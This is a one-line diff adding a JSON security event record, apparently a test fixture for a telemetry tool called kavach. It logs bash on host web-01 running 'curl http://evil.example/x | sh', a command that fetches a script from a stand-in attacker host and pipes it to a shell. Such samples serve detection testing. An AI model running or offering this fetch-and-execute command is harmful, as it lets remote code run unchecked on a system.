@@ -1,0 +1,1 @@
+{"event":{"id":"e1","time":"2026-01-02T03:04:05.123Z","host":"web-01","pid":4242,"ppid":1,"uid":1000,"executable":"/usr/bin/curl","parent_exe":"/bin/bash","command":"curl http://evil.example/x | sh"},"host":"web-01","source":"kavach","sourcetype":"kavach:event","time":1767323045.123}
